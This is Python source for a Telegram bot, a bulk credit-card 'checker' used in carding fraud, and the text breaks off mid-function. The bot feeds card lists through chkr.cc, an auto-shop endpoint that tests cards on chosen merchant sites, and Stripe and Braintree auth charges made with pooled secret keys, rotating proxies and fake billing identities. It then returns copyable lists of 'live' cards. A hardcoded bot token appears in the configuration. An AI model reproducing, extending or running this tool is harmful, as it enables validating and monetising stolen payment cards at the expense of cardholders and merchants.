import telebot
import requests
import re
import threading
import time
import json
import os
import stripe
import random
import string
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from telebot import types
from collections import defaultdict, deque
from functools import lru_cache

# Try to import braintree SDK, fallback to requests if not available
try:
    import braintree
    BRAINTREE_AVAILABLE = True
except ImportError:
    BRAINTREE_AVAILABLE = False

# ULTIMATE CC CHECKER v5.0 - ENHANCED WITH STATS, RATE LIMITING & MORE
# Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN', '7871536716:AAG2axHuGYOTBeHJhO7JjbDvRQBnvdeJbk0')
CHKR_API = "https://api.chkr.cc/"
AUTOSH_API = "http://goatedsh.hopto.org/autog.php"
BIN_API = "https://lookup.binlist.net/"
PROXY_FILE = "proxies.txt"
SK_FILE = "sk_keys.txt"
BT_FILE = "braintree_keys.txt"
STATS_FILE = "stats.json"
HISTORY_FILE = "check_history.json"

# Bot Configuration
MAX_CHECKS_PER_MINUTE = 15
BULK_MAX_CARDS = 100
BULK_WORKERS = 12
API_TIMEOUT = 30
MAX_RETRIES = 3

bot = telebot.TeleBot(BOT_TOKEN)

# Global State
DEBUG_MODE = False
CHECK_HISTORY = deque(maxlen=1000)  # Keep last 1000 checks
USER_RATE_LIMIT = defaultdict(list)  # {user_id: [timestamps]}
STATS = {
    'total_checks': 0,
    'live_count': 0,
    'dead_count': 0,
    'error_count': 0,
    'bulk_checks': 0,
    'last_check': None
}
PROXY_LOCK = threading.Lock()
SK_LOCK = threading.Lock()

# Load statistics
if os.path.exists(STATS_FILE):
    try:
        with open(STATS_FILE, 'r') as f:
            loaded_stats = json.load(f)
            STATS.update(loaded_stats)
    except:
        pass

# Load check history
if os.path.exists(HISTORY_FILE):
    try:
        with open(HISTORY_FILE, 'r') as f:
            history_data = json.load(f)
            CHECK_HISTORY.extend(history_data[-1000:])  # Load last 1000
    except:
        pass

# Proxy Management
PROXY_POOL = []
if os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        PROXY_POOL = [line.strip() for line in f if line.strip()]

def save_proxies():
    with open(PROXY_FILE, 'w') as f:
        for proxy in PROXY_POOL:
            f.write(f"{proxy}\n")

# Stripe SK Management
SK_KEYS = []
if os.path.exists(SK_FILE):
    with open(SK_FILE, 'r') as f:
        SK_KEYS = [line.strip() for line in f if line.strip()]

def save_sk_keys():
    with open(SK_FILE, 'w') as f:
        for sk in SK_KEYS:
            f.write(f"{sk}\n")

# Braintree Credentials Management
BT_CREDENTIALS = []  # Format: merchant_id|public_key|private_key
if os.path.exists(BT_FILE):
    with open(BT_FILE, 'r') as f:
        BT_CREDENTIALS = [line.strip() for line in f if line.strip()]

def save_bt_credentials():
    with open(BT_FILE, 'w') as f:
        for cred in BT_CREDENTIALS:
            f.write(f"{cred}\n")

# Rate Limiting
def check_rate_limit(user_id):
    """Check if user has exceeded rate limit"""
    now = time.time()
    if user_id in USER_RATE_LIMIT:
        # Remove timestamps older than 1 minute
        USER_RATE_LIMIT[user_id] = [t for t in USER_RATE_LIMIT[user_id] if now - t < 60]
        if len(USER_RATE_LIMIT[user_id]) >= MAX_CHECKS_PER_MINUTE:
            return False
        USER_RATE_LIMIT[user_id].append(now)
    else:
        USER_RATE_LIMIT[user_id] = [now]
    return True

def get_rate_limit_status(user_id):
    """Get remaining checks for user"""
    now = time.time()
    if user_id in USER_RATE_LIMIT:
        USER_RATE_LIMIT[user_id] = [t for t in USER_RATE_LIMIT[user_id] if now - t < 60]
        remaining = MAX_CHECKS_PER_MINUTE - len(USER_RATE_LIMIT[user_id])
        return remaining
    return MAX_CHECKS_PER_MINUTE

# Input Validation
def luhn_check(card_num):
    """Luhn algorithm validation"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_num)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d*2))
    return checksum % 10 == 0

def validate_expiry(month, year):
    """Check if expiry is in the future"""
    try:
        current_year = datetime.now().year % 100
        current_month = datetime.now().month
        year_int = int(year)
        month_int = int(month)
        
        if year_int < current_year:
            return False
        if year_int == current_year and month_int < current_month:
            return False
        return True
    except:
        return False

def validate_cvv(cvv):
    """Validate CVV length"""
    return len(cvv) >= 3 and len(cvv) <= 4 and cvv.isdigit()

# CC Parser with Validation
def parse_cc(cc_string):
    cc_clean = re.sub(r'[^\d|]', '', cc_string.replace('|', '|'))
    parts = cc_clean.split('|')
    if len(parts) >= 4:
        card, mon, year, cvv = parts[:4]
        card = card.strip()
        mon = mon.zfill(2)[:2]
        year = year.zfill(2)[:2]
        
        # Validate card number
        if not card.isdigit() or len(card) < 13 or len(card) > 19:
            return None
        
        # Optional: Luhn check (can be disabled for testing)
        # if not luhn_check(card):
        #     return None
        
        # Validate month
        if len(mon) != 2 or not (1 <= int(mon) <= 12):
            return None
        
        # Validate year
        if len(year) != 2:
            return None
        
        # Validate expiry
        if not validate_expiry(mon, year):
            return None
        
        # Validate CVV
        if not validate_cvv(cvv):
            return None
        
        return f"{card}|{mon}|{year}|{cvv}"
    return None

# File Content Extractor
def extract_text_from_file(message):
    """Extract text content from uploaded or forwarded document"""
    try:
        # Check if message has a document
        if message.document:
            file_info = bot.get_file(message.document.file_id)
            
            # Only process text files
            if not message.document.file_name.endswith(('.txt', '.text')):
                return None, "❌ Only .txt files are supported!"
            
            # Check file size (max 10MB)
            if message.document.file_size > 10 * 1024 * 1024:
                return None, "❌ File too large! Max 10MB."
            
            # Download file
            file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
            response = requests.get(file_url, timeout=30)
            
            if response.status_code == 200:
                # Try to decode as text
                try:
                    content = response.text
                except:
                    # Try different encodings
                    content = response.content.decode('utf-8', errors='ignore')
                
                return content, None
            else:
                return None, f"❌ Failed to download file (HTTP {response.status_code})"
        
        # Check if message has text (for forwarded messages with text)
        elif message.text:
            return message.text, None
        
        return None, "❌ No file or text found in message"
        
    except Exception as e:
        return None, f"❌ Error processing file: {str(e)}"

# BIN Info
def get_bin_info(bin_num):
    try:
        resp = requests.get(f"{BIN_API}{bin_num}", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            return {
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'bank': data.get('bank', {}).get('name', 'Unknown'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'emoji': data.get('country', {}).get('emoji', '🌍')
            }
    except:
        pass
    return None

# Statistics Management
def save_stats():
    """Save statistics to file"""
    try:
        with open(STATS_FILE, 'w') as f:
            json.dump(STATS, f, indent=2)
    except:
        pass

def save_history():
    """Save check history to file"""
    try:
        with open(HISTORY_FILE, 'w') as f:
            json.dump(list(CHECK_HISTORY), f, indent=2)
    except:
        pass

def record_check(cc_data, status, method='CHKR.CC', user_id=None):
    """Record a check in history and stats"""
    check_record = {
        'cc': cc_data.split('|')[0][:6] + '****',  # Only store BIN
        'status': status,
        'method': method,
        'timestamp': datetime.now().isoformat(),
        'user_id': user_id
    }
    CHECK_HISTORY.append(check_record)
    
    STATS['total_checks'] += 1
    STATS['last_check'] = datetime.now().isoformat()
    
    if status == 'live':
        STATS['live_count'] += 1
    elif status == 'dead':
        STATS['dead_count'] += 1
    else:
        STATS['error_count'] += 1
    
    # Auto-save every 10 checks
    if STATS['total_checks'] % 10 == 0:
        save_stats()
        save_history()

# Get Proxy (Thread-safe)
def get_proxy():
    with PROXY_LOCK:
        if PROXY_POOL:
            return PROXY_POOL[int(time.time()) % len(PROXY_POOL)]
    return None

# Get SK Key (Thread-safe)
def get_sk_key():
    with SK_LOCK:
        if SK_KEYS:
            return SK_KEYS[int(time.time()) % len(SK_KEYS)]
    return None

# Get Braintree Credentials (Thread-safe)
def get_bt_credentials():
    with SK_LOCK:  # Reuse lock
        if BT_CREDENTIALS:
            cred_str = BT_CREDENTIALS[int(time.time()) % len(BT_CREDENTIALS)]
            parts = cred_str.split('|')
            if len(parts) == 3:
                return parts[0], parts[1], parts[2]  # merchant_id, public_key, private_key
    return None, None, None

def random_string(length=6):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# STRIPE CHECK LOGIC
def check_cc_stripe(cc_data, sk_key, amount=100, currency="usd"):
    try:
        stripe.api_key = sk_key
        card, mon, year, cvv = cc_data.split('|')
        
        email = f"shadowdemo{random_string()}@gmail.com"
        
        # Create Payment Method with Billing Details (Improved Success)
        pm = stripe.PaymentMethod.create(
            type="card",
            card={
                "number": card,
                "exp_month": int(mon),
                "exp_year": int(year),
                "cvc": cvv,
            },
            billing_details={
                "address": {
                    "line1": "36",
                    "line2": "Regent Street",
                    "city": "Jamestown",
                    "postal_code": "14701",
                    "state": "New York",
                    "country": "US",
                },
                "email": email,
                "name": "Shadow Demon Mittal",
            }
        )
        
        # Attempt Auth (PaymentIntent with capture_method=manual)
        pi = stripe.PaymentIntent.create(
            amount=amount,
            currency=currency,
            payment_method=pm.id,
            confirm=True,
            capture_method="manual",
            setup_future_usage="off_session",
            description="Shadow Donation",
        )
        
        if pi.status == "requires_capture":
            # Cancel the auth immediately so we don't actually hold funds
            stripe.PaymentIntent.cancel(pi.id)
            return f"✅ **STRIPE:** LIVE (Auth Success - {currency.upper()} {amount/100:.2f})"
        else:
            return f"⚠️ **STRIPE:** {pi.status}"
            
    except stripe.error.CardError as e:
        return f"❌ **STRIPE:** DEAD ({e.user_message})"
    except stripe.error.InvalidRequestError as e:
        if "generally unsafe" in str(e):
            return "❌ **STRIPE: RESTRICTED KEY**\nThis SK key cannot handle raw card data. Enable 'Handle card data directly' in Stripe Dashboard or use a different key."
        return f"❌ **STRIPE:** ERROR ({str(e)})"
    except Exception as e:
        return f"❌ **STRIPE:** ERROR ({str(e)})"

# CHKR.CC API CHECK
def check_cc_chkr(cc_data, proxy=None):
    try:
        payload = {"data": cc_data}
        headers = {"Content-Type": "application/json"}
        
        # Use proxy if provided
        proxies = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                host, port, user, pwd = proxy_parts
                proxies = {
                    "http": f"http://{user}:{pwd}@{host}:{port}",
                    "https": f"https://{user}:{pwd}@{host}:{port}"  # Fixed: was http://
                }
        
        resp = requests.post(CHKR_API, json=payload, headers=headers, proxies=proxies, timeout=API_TIMEOUT)
        
        if resp.status_code == 429:
            return "⚠️ **CHKR.CC:** Too Many Requests (Rate Limited)"
        
        if resp.status_code != 200:
            return f"❌ **CHKR.CC:** HTTP {resp.status_code}"
        
        # Parse response
        try:
            result = resp.json()
        except:
            # If response is not JSON, try parsing as text
            result_text = resp.text.strip()
            if DEBUG_MODE:
                print(f"DEBUG: {cc_data} -> {result_text}")
            return f"⚠️ **CHKR.CC:** Invalid Response - `{result_text[:100]}`"
        
        code = result.get('code', 2)
        status = result.get('status', 'Unknown')
        message = result.get('message', '')
        card_info = result.get('card', {})
        
        output = []
        
        # Status based on code: 0=Die, 1=Live, 2=Unknown
        if code == 1:
            output.append(f"✅ **STATUS:** LIVE")
        elif code == 0:
            output.append(f"❌ **STATUS:** DEAD")
        else:
            output.append(f"⚠️ **STATUS:** UNKNOWN")
        
        if message:
            output.append(f"📝 **Message:** {message}")
        
        # Card details
        if card_info:
            bank = card_info.get('bank', 'N/A')
            card_type = card_info.get('type', 'N/A')
            category = card_info.get('category', 'N/A')
            brand = card_info.get('brand', 'N/A')
            country = card_info.get('country', {})
            
            if bank and bank != 'N/A':
                output.append(f"🏦 **Bank:** {bank}")
            if brand and brand != 'N/A':
                output.append(f"💳 **Brand:** {brand}")
            if card_type and card_type != 'N/A':
                output.append(f"🔹 **Type:** {card_type}")
            if category and category != 'N/A':
                output.append(f"📊 **Category:** {category.upper()}")
            
            if country:
                country_name = country.get('name', '')
                country_code = country.get('code', '')
                country_emoji = country.get('emoji', '🌍')
                currency = country.get('currency', '')
                
                if country_name:
                    output.append(f"{country_emoji} **Country:** {country_name} ({country_code})")
                if currency:
                    output.append(f"💵 **Currency:** {currency}")
        
        if DEBUG_MODE:
            output.append(f"🔍 **RAW:** `{json.dumps(result)[:200]}`")
        
        return "\n".join(output)
        
    except requests.exceptions.Timeout:
        return "❌ **CHKR.CC:** TIMEOUT (Service Overloaded)"
    except requests.exceptions.RequestException as e:
        return f"❌ **CHKR.CC:** ERROR ({str(e)})"
    except Exception as e:
        return f"❌ **CHKR.CC:** ERROR ({str(e)})"

# AUTO-SHOP API CHECK (Tests card on specific merchant site)
def check_cc_autosh(cc_data, site_url, proxy=None):
    """Check card using auto-shop API on a specific merchant site"""
    try:
        # Validate and format site URL
        if not site_url.startswith(('http://', 'https://')):
            site_url = 'https://' + site_url
        
        # Build API URL
        api_url = f"{AUTOSH_API}?cc={cc_data}&site={site_url}"
        
        # Use proxy if provided
        proxies = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                host, port, user, pwd = proxy_parts
                proxies = {
                    "http": f"http://{user}:{pwd}@{host}:{port}",
                    "https": f"https://{user}:{pwd}@{host}:{port}"  # Fixed
                }
        
        resp = requests.get(api_url, proxies=proxies, timeout=API_TIMEOUT)
        
        if resp.status_code != 200:
            return f"❌ **AUTO-SHOP:** HTTP {resp.status_code}"
        
        result_text = resp.text.strip().lower()
        
        output = []
        
        # Parse response (common patterns)
        if any(x in result_text for x in ['live', 'approved', 'success', 'charged', 'auth', 'valid']):
            output.append(f"✅ **AUTO-SHOP:** LIVE")
        elif any(x in result_text for x in ['die', 'declined', 'invalid', 'insufficient', 'fraud', 'error']):
            output.append(f"❌ **AUTO-SHOP:** DEAD")
        else:
            output.append(f"⚠️ **AUTO-SHOP:** UNKNOWN")
        
        output.append(f"🌐 **Site:** {site_url}")
        
        # Try to extract gateway info if present
        gateway_patterns = {
            'stripe': ['stripe', 'stripe.com'],
            'paypal': ['paypal'],
            'authorize': ['authorize.net', 'authorizenet'],
            'braintree': ['braintree'],
            'square': ['square'],
            'adyen': ['adyen']
        }
        
        for gateway, patterns in gateway_patterns.items():
            if any(p in result_text for p in patterns):
                output.append(f"💳 **Gateway:** {gateway.upper()}")
                break
        
        if DEBUG_MODE:
            output.append(f"🔍 **RAW:** `{result_text[:150]}`")
        
        return "\n".join(output)
        
    except requests.exceptions.Timeout:
        return f"❌ **AUTO-SHOP:** TIMEOUT"
    except requests.exceptions.RequestException as e:
        return f"❌ **AUTO-SHOP:** ERROR ({str(e)})"
    except Exception as e:
        return f"❌ **AUTO-SHOP:** ERROR ({str(e)})"

# Multi-API Parallel Check
def check_multi_api(cc_data, proxy=None):
    """Check card with all available APIs in parallel"""
    results = {}
    
    def check_chkr():
        try:
            return 'CHKR.CC', check_cc_chkr(cc_data, proxy)
        except Exception as e:
            return 'CHKR.CC', f"❌ Error: {str(e)[:50]}"
    
    def check_stripe():
        try:
            sk = get_sk_key()
            if sk:
                return 'STRIPE', check_cc_stripe(cc_data, sk)
            return 'STRIPE', "❌ No SK keys loaded"
        except Exception as e:
            return 'STRIPE', f"❌ Error: {str(e)[:50]}"
    
    def check_braintree():
        try:
            merchant_id, public_key, private_key = get_bt_credentials()
            if merchant_id and public_key and private_key:
                return 'BRAINTREE', check_cc_braintree(cc_data, merchant_id, public_key, private_key)
            return 'BRAINTREE', "❌ No Braintree credentials loaded"
        except Exception as e:
            return 'BRAINTREE', f"❌ Error: {str(e)[:50]}"
    
    # Build futures list
    futures_list = []
    merchant_id, _, _ = get_bt_credentials()
    
    # Run checks in parallel
    max_workers = 3 if merchant_id else 2
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures_list.append(executor.submit(check_chkr))
        futures_list.append(executor.submit(check_stripe))
        if merchant_id:
            futures_list.append(executor.submit(check_braintree))
        
        futures = futures_list
        
        for future in as_completed(futures):
            try:
                api_name, result = future.result()
                results[api_name] = result
            except Exception as e:
                results['ERROR'] = f"❌ {str(e)[:50]}"
    
    # Format output
    output = []
    for api_name, result in results.items():
        output.append(f"**{api_name}:**\n{result}")
    
    return "\n\n".join(output)

# ULTIMATE CHECK: CHKR.CC API + STRIPE OPTION
def check_cc_ultimate(cc_data, proxy=None, use_stripe=False, multi_api=False):
    output = []
    
    if multi_api:
        return check_multi_api(cc_data, proxy)
    
    if use_stripe:
        sk = get_sk_key()
        if sk:
            result = check_cc_stripe(cc_data, sk)
            status = 'live' if 'LIVE' in result else 'dead' if 'DEAD' in result else 'unknown'
            record_check(cc_data, status, 'STRIPE')
            output.append(result)
        else:
            output.append("❌ **STRIPE:** NO SK KEYS LOADED")
        return "\n".join(output)

    # Use CHKR.CC API
    result = check_cc_chkr(cc_data, proxy)
    status = 'live' if 'LIVE' in result else 'dead' if 'DEAD' in result else 'unknown'
    record_check(cc_data, status, 'CHKR.CC')
    output.append(result)
    
    return "\n".join(output)

# Bulk Check with Progress Updates
def bulk_check_ultimate(cc_list, proxy=None, use_stripe=False, progress_callback=None):
    results = []
    stats = {'live': 0, 'high_balance': 0, 'dead': 0, 'error': 0}
    total = len(cc_list)

    def check_single(cc, index):
        result = check_cc_ultimate(cc, proxy, use_stripe)
        if 'LIVE' in result:
            if 'HIGH LIMIT' in result:
                stats['high_balance'] += 1
            stats['live'] += 1
        elif 'DEAD' in result:
            stats['dead'] += 1
        else:
            stats['error'] += 1
        
        # Progress update every 5 cards or at end
        if progress_callback and (index % 5 == 0 or index == total - 1):
            progress_callback(index + 1, total, stats)
        
        return result

    with ThreadPoolExecutor(max_workers=BULK_WORKERS) as executor:
        futures = {executor.submit(check_single, cc, i): i for i, cc in enumerate(cc_list)}
        results_dict = {}
        for future in as_completed(futures):
            index = futures[future]
            try:
                results_dict[index] = future.result()
            except Exception as e:
                results_dict[index] = f"❌ Error: {str(e)[:50]}"
                stats['error'] += 1
        
        # Reorder results
        results = [results_dict[i] for i in range(total)]
        time.sleep(0.1)  # Rate limiting

    STATS['bulk_checks'] += 1
    save_stats()
    return results, stats

# Test Proxy
def test_proxy(proxy):
    try:
        payload = {"data": "4111111111111111|12|25|123"}
        headers = {"Content-Type": "application/json"}
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            host, port, user, pwd = proxy_parts
            proxies = {
                "http": f"http://{user}:{pwd}@{host}:{port}",
                "https": f"https://{user}:{pwd}@{host}:{port}"  # Fixed
            }
            resp = requests.post(CHKR_API, json=payload, headers=headers, proxies=proxies, timeout=10)
            return resp.status_code == 200
    except:
        return False

# COMMANDS
@bot.message_handler(commands=['start', 'help'])
def help_command(message):
    proxy_count = len(PROXY_POOL)
    sk_count = len(SK_KEYS)
    help_text = f"""
🔥 ULTIMATE CC CHECKER v4.4 🔥

💳 CORE CHECKS:
/check card ✅ CHKR.CC API Check
/skcheck card ⚡️ Stripe SK Auth
/btcheck card 💳 Braintree API Check
/multicheck card 🔄 Multi-API Parallel Check
/autosh 🛒 Auto-Shop Check (Send URL or URL + card)
/bin 411111 🌍 BIN lookup
/bulk ⚡️ Bulk (12/sec) - Text or .txt file
/skbulk ⚡️ Bulk Stripe SK - Text or .txt file
/charge card 5.00 [usd/inr] 💵 Custom auth

📊 STATISTICS & HISTORY:
/stats 📊 Bot statistics
/recent 📜 Recent check history
/export 📋 Export valid cards

📄 FILE SUPPORT:
Upload or forward .txt files directly!
The bot will detect and process them automatically.

🔌 PROXY MANAGER:
/addproxy host:port:user:pass ➕ Add + test
/delproxy host:port:user:pass ➖ Remove
/proxylist 📋 List all

🔑 STRIPE SK MANAGER:
/addsk sk_live_... ➕ Add + test
/testsk 🧪 Test all SK capabilities (Parallel)
/delsk sk_live_... ➖ Remove
/sklist 📋 List all

💳 BRAINTREE MANAGER:
/addbt merchant|public|private ➕ Add credentials
/btlist 📋 List all
/delbt merchant|public|private ➖ Remove

ℹ️ INFO:
/status Bot status
/debug Toggle raw response logging
/clear Clear chat

Proxies: {proxy_count} | SK Keys: {sk_count}
"""
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['check'])
def single_check(message):
    try:
        # Rate limiting
        if not check_rate_limit(message.from_user.id):
            remaining = get_rate_limit_status(message.from_user.id)
            bot.reply_to(message, f"⏱️ **Rate Limit Exceeded!**\n\nYou can check {remaining} more cards in the next minute.\n\nPlease wait a moment before trying again.", parse_mode='Markdown')
            return
        
        cc_raw = message.text.split(maxsplit=1)[1].strip()
        cc_data = parse_cc(cc_raw)
        if not cc_data:
            bot.reply_to(message, "❌ Format: 4111111111111111|12|25|123", parse_mode='Markdown')
            return

        proxy = get_proxy()
        proxy_text = " | **Proxy:** ON" if proxy else " | **Direct**"
        bot.reply_to(message, f"🔄 `{cc_data}`{proxy_text}", parse_mode='Markdown')
        
        result = check_cc_ultimate(cc_data, proxy)
        bin_num = cc_data.split('|')[0][:6]
        bin_info = get_bin_info(bin_num)
        bin_text = f"\n{bin_info['emoji']} **{bin_info['brand']}**" if bin_info else ""
        
        bot.reply_to(message, f"**{cc_data}**\n{result}{bin_text}", parse_mode='Markdown')
    except Exception as e:
        error_msg = f"❌ Invalid input!"
        if DEBUG_MODE:
            error_msg += f"\nError: {str(e)}"
        bot.reply_to(message, error_msg)

@bot.message_handler(commands=['skcheck'])
def sk_check(message):
    try:
        cc_raw = message.text.split(maxsplit=1)[1].strip()
        cc_data = parse_cc(cc_raw)
        if not cc_data:
            return

        bot.reply_to(message, f"⚡️ **Stripe Checking:** `{cc_data}`", parse_mode='Markdown')
        result = check_cc_ultimate(cc_data, use_stripe=True)
        bot.reply_to(message, f"**{cc_data}**\n{result}", parse_mode='Markdown')
    except:
        bot.reply_to(message, "❌ **Usage:** `/skcheck 4111111111111111|12|25|123`")

@bot.message_handler(commands=['autosh'])
def autosh_check(message):
    try:
        parts = message.text.split(maxsplit=2)
        
        # If only command, ask for URL first
        if len(parts) == 1:
            bot.reply_to(message, "🛒 **AUTO-SHOP CHECK**\n\nSend me a shop URL (e.g., https://example.com or example.com):")
            bot.register_next_step_handler(message, autosh_get_url)
            return
        
        # If URL provided, ask for card
        if len(parts) == 2:
            site_url = parts[1].strip()
            bot.reply_to(message, f"🌐 **Site:** {site_url}\n\nNow send me the card to test (format: 4111111111111111|12|25|123):")
            bot.register_next_step_handler_by_chat_id(message.chat.id, lambda m: autosh_process_card(m, site_url))
            return
        
        # If both provided
        cc_raw = parts[1].strip()
        site_url = parts[2].strip()
        cc_data = parse_cc(cc_raw)
        
        if not cc_data:
            bot.reply_to(message, "❌ Invalid card format! Use: `4111111111111111|12|25|123`", parse_mode='Markdown')
            return
        
        proxy = get_proxy()
        proxy_text = " | **Proxy:** ON" if proxy else " | **Direct**"
        bot.reply_to(message, f"🛒 **Auto-Shop Check:** `{cc_data}`\n🌐 **Site:** {site_url}{proxy_text}", parse_mode='Markdown')
        
        result = check_cc_autosh(cc_data, site_url, proxy)
        bot.reply_to(message, f"**{cc_data}**\n{result}", parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** {str(e)}\n\n**Usage:** `/autosh` or `/autosh url` or `/autosh card url`", parse_mode='Markdown')

def autosh_get_url(message):
    """Get URL from user"""
    try:
        site_url = message.text.strip()
        
        # Validate URL
        url = extract_url(site_url)
        if not url:
            bot.reply_to(message, "❌ Invalid URL! Send a valid URL (e.g., https://example.com)")
            return
        
        bot.reply_to(message, f"🌐 **Site:** {url}\n\nNow send me the card to test (format: 4111111111111111|12|25|123):")
        bot.register_next_step_handler(message, lambda m: autosh_process_card(m, url))
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def autosh_process_card(message, site_url):
    """Process card with the provided URL"""
    try:
        cc_data = parse_cc(message.text)
        
        if not cc_data:
            bot.reply_to(message, "❌ Invalid card format! Use: `4111111111111111|12|25|123`", parse_mode='Markdown')
            return
        
        proxy = get_proxy()
        proxy_text = " | **Proxy:** ON" if proxy else " | **Direct**"
        bot.reply_to(message, f"🛒 **Auto-Shop Check:** `{cc_data}`\n🌐 **Site:** {site_url}{proxy_text}", parse_mode='Markdown')
        
        result = check_cc_autosh(cc_data, site_url, proxy)
        bot.reply_to(message, f"**{cc_data}**\n{result}", parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['bin'])
def bin_lookup(message):
    try:
        bin_num = message.text.split(maxsplit=1)[1].strip()[:6]
        bin_info = get_bin_info(bin_num)
        if bin_info:
            bot.reply_to(message, f"""
BIN: {bin_num}
{bin_info['emoji']} {bin_info['brand']}
🏦 Bank: {bin_info['bank']}
💳 Type: {bin_info['type']}
🌍 Country: {bin_info['country']}
""", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ BIN {bin_num} not found")
    except:
        bot.reply_to(message, "❌ Usage: /bin 411111")

@bot.message_handler(commands=['bulk'])
def bulk_start(message):
    bot.reply_to(message, "📋 **BULK CHECK**\n\nSend cards (one per line, max 100) or upload/forward a .txt file:")
    bot.register_next_step_handler(message, process_bulk)

def process_bulk(message):
    try:
        # Rate limiting for bulk
        if not check_rate_limit(message.from_user.id):
            remaining = get_rate_limit_status(message.from_user.id)
            bot.reply_to(message, f"⏱️ **Rate Limit Exceeded!**\n\nPlease wait before starting a new bulk check.", parse_mode='Markdown')
            return
        
        # Try to extract from file first, then fall back to text
        file_content, error = extract_text_from_file(message)
        
        if error:
            bot.reply_to(message, error)
            return
        
        if not file_content:
            # Fall back to message text
            if not message.text:
                bot.reply_to(message, "❌ No cards found! Send cards or upload a .txt file.")
                return
            file_content = message.text
        
        # Parse cards from content
        cc_raw_list = [line.strip() for line in file_content.split('\n') if line.strip()]
        cc_list = [parse_cc(cc) for cc in cc_raw_list[:BULK_MAX_CARDS] if parse_cc(cc)]

        if not cc_list:
            bot.reply_to(message, "❌ No valid cards found in file/text!")
            return
        
        proxy = get_proxy()
        proxy_text = " | Proxy: ON" if proxy else " | Direct"
        progress_msg = bot.reply_to(message, f"⚡️ **Bulk: {len(cc_list)} cards**{proxy_text}\n⏳ Processing 0/{len(cc_list)}...", parse_mode='Markdown')
        
        def progress_callback(current, total, stats):
            percentage = (current * 100) // total
            status_text = f"✅ {stats['live']} | ❌ {stats['dead']} | ⚠️ {stats['error']}"
            try:
                bot.edit_message_text(
                    f"⚡️ **Bulk: {len(cc_list)} cards**{proxy_text}\n⏳ Processing {current}/{total} ({percentage}%)\n{status_text}",
                    message.chat.id,
                    progress_msg.message_id,
                    parse_mode='Markdown'
                )
            except:
                pass  # Ignore edit errors
        
        results, stats = bulk_check_ultimate(cc_list, proxy, False, progress_callback)
        
        # Update final progress message
        try:
            bot.edit_message_text(
                f"✅ **Bulk Complete!** {len(cc_list)} cards processed",
                message.chat.id,
                progress_msg.message_id,
                parse_mode='Markdown'
            )
        except:
            pass
        
        output = f"📊 **RESULTS** ({len(cc_list)} total):\n\n"
        lives = []
        valid_cards = []  # Store valid card numbers for copying
        for i, result in enumerate(results, 1):
            card_short = cc_list[i-1].split('|')[0][:19] + "..."
            status = "💎" if "HIGH LIMIT" in result else "✅" if "LIVE" in result else "❌"
            output += f"{i:2d}. {status} `{card_short}`\n"
            if "LIVE" in result:
                lives.append(result)
                valid_cards.append(cc_list[i-1])  # Store full card data
        
        output += f"\n**STATS:** 💎{stats['high_balance']} {stats['live']}✅ {stats['dead']}❌"
        bot.reply_to(message, output, parse_mode='Markdown')
        
        if lives:
            lives_text = "**🎯 LIVE CARDS:**\n" + "\n\n".join(lives[:5])
            bot.reply_to(message, lives_text, parse_mode='Markdown')
        
        # Send copyable valid cards list
        if valid_cards:
            copyable_text = "📋 **COPY VALID CARDS:**\n\n```\n"
            copyable_text += "\n".join(valid_cards)
            copyable_text += "\n```"
            bot.reply_to(message, copyable_text, parse_mode='Markdown')
            
    except Exception as e:
        bot.reply_to(message, f"❌ Bulk failed: {str(e)}")

@bot.message_handler(commands=['skbulk'])
def sk_bulk_start(message):
    bot.reply_to(message, "⚡️ **STRIPE SK BULK CHECK**\n\nSend cards (one per line, max 100) or upload/forward a .txt file:")
    bot.register_next_step_handler(message, process_sk_bulk)

def process_sk_bulk(message):
    try:
        # Try to extract from file first, then fall back to text
        file_content, error = extract_text_from_file(message)
        
        if error:
            bot.reply_to(message, error)
            return
        
        if not file_content:
            # Fall back to message text
            if not message.text:
                bot.reply_to(message, "❌ No cards found! Send cards or upload a .txt file.")
                return
            file_content = message.text
        
        # Parse cards from content
        cc_raw_list = [line.strip() for line in file_content.split('\n') if line.strip()]
        cc_list = [parse_cc(cc) for cc in cc_raw_list[:100] if parse_cc(cc)]

        if not cc_list:
            bot.reply_to(message, "❌ No valid cards found in file/text!")
            return
        
        if not SK_KEYS:
            bot.reply_to(message, "❌ No Stripe SK keys loaded! Use /addsk first.")
            return

        bot.reply_to(message, f"⚡️ **Stripe Bulk: {len(cc_list)} cards**")
        results, stats = bulk_check_ultimate(cc_list, use_stripe=True)
        
        output = f"📊 **STRIPE RESULTS** ({len(cc_list)} total):\n\n"
        lives = []
        valid_cards = []  # Store valid card numbers for copying
        for i, result in enumerate(results, 1):
            card_short = cc_list[i-1].split('|')[0][:19] + "..."
            status = "✅" if "LIVE" in result else "❌"
            output += f"{i:2d}. {status} `{card_short}`\n"
            if "LIVE" in result:
                lives.append(result)
                valid_cards.append(cc_list[i-1])  # Store full card data
        
        output += f"\n**STATS:** {stats['live']}✅ {stats['dead']}❌"
        bot.reply_to(message, output, parse_mode='Markdown')
        
        if lives:
            lives_text = "**🎯 LIVE CARDS:**\n" + "\n\n".join(lives[:5])
            bot.reply_to(message, lives_text, parse_mode='Markdown')
        
        # Send copyable valid cards list
        if valid_cards:
            copyable_text = "📋 **COPY VALID CARDS:**\n\n```\n"
            copyable_text += "\n".join(valid_cards)
            copyable_text += "\n```"
